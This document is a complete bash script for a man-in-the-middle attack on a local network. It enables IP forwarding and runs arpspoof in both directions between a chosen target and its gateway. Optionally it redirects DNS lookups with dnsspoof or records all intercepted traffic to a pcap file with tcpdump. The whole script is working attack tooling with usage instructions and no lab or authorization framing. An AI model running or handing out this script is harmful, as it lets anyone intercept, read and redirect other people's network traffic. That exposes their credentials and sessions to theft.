#!/bin/bash

# This script performs ARP spoofing to intercept traffic.
# It optionally supports DNS spoofing and traffic capture.

# Dynamically get the active network interface
# The `ip route` command is used to identify the default network interface associated with the default route.
# This ensures the script automatically selects the primary active interface if the user does not specify one.
interface=$(ip route | grep default | awk '{print $5}')

# Default values for optional parameters
capture=false           # Flag to enable or disable traffic capture
dns_spoof_hosts=""      # Path to the DNS spoofing hosts file (optional)

# Parse command-line arguments
# The script accepts the following options:
# --interface <interface>: Specify the network interface to use (default is dynamically detected).
# --target <IP>: Specify the target IP address for ARP spoofing.
# --gateway <IP>: Specify the gateway IP address for ARP spoofing.
# --capture: Enable traffic capture and save it to a file.
# --dns-spoof <file>: Specify a hosts file for DNS spoofing.
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --interface)
            # Override the default interface with the user-specified one
            interface="$2"
            shift
            ;;
        --target)
            # Set the target IP address for ARP spoofing
            target="$2"
            shift
            ;;
        --gateway)
            # Set the gateway IP address for ARP spoofing
            gateway="$2"
            shift
            ;;
        --capture)
            # Enable traffic capture
            capture=true
            ;;
        --dns-spoof)
            # Specify the DNS spoofing hosts file
            dns_spoof_hosts="$2"
            shift
            ;;
        *)
            # Handle unknown parameters
            echo "Unknown parameter: $1"
            echo "Usage: $0 --target <IP> --gateway <IP> [--interface <interface>] [--capture] [--dns-spoof <file>]"
            exit 1
            ;;
    esac
    shift
done

# Validate required parameters
# Both the target and gateway IP addresses are required for ARP spoofing.
if [ -z "$target" ] || [ -z "$gateway" ]; then
    echo "Error: Please specify both --target and --gateway."
    echo "Usage: $0 --target <IP> --gateway <IP> [--interface <interface>] [--capture] [--dns-spoof <file>]"
    exit 1
fi

# Enable IP forwarding
# IP forwarding is necessary to allow traffic to be forwarded between the target and the gateway.
# This command writes "1" to the /proc/sys/net/ipv4/ip_forward file.
echo "Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# Start ARP spoofing in the background
# The `arpspoof` tool sends spoofed ARP packets to the target and the gateway.
# Two processes are started to poison the ARP cache in both directions.
echo "Starting ARP spoofing..."
sudo arpspoof -i "$interface" -t "$target" "$gateway" &
arpspoof_pid1=$!  # Capture the process ID of the first `arpspoof` command
sudo arpspoof -i "$interface" -t "$gateway" "$target" &
arpspoof_pid2=$!  # Capture the process ID of the second `arpspoof` command

# Set up a trap to clean up background processes on exit
# This ensures that the ARP spoofing processes are stopped when the script is terminated.
trap "kill $arpspoof_pid1 $arpspoof_pid2 2>/dev/null; echo 'Cleaned up ARP spoofing processes'" EXIT

# Start DNS spoofing if a hosts file is specified
if [ -n "$dns_spoof_hosts" ]; then
    echo "Starting DNS spoofing with hosts file: $dns_spoof_hosts"
    sudo dnsspoof -i "$interface" -f "$dns_spoof_hosts"

# Start traffic capture if the capture flag is enabled
elif [ "$capture" = true ]; then
    echo "Capturing traffic on interface: $interface"
    echo "Saving captured packets to capture.pcap"
    sudo tcpdump -i "$interface" -w capture.pcap

# If neither DNS spoofing nor traffic capture is enabled, keep ARP spoofing running
else
    echo "ARP spoofing is active. Press Ctrl+C to stop."
    while true; do sleep 1; done
fi
